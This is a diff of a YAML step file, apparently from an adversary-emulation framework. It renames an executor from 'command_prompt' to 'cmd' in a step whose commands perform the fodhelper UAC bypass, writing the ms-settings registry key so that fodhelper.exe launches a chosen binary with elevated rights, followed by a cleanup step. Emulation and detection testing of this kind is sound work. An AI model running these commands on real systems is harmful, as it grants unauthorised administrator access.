@@ -25,8 +25,8 @@ steps:
         reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{{.Args.executable_binary}}" /f
         reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
         fodhelper.exe
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
-        executor: command_prompt
+        executor: cmd
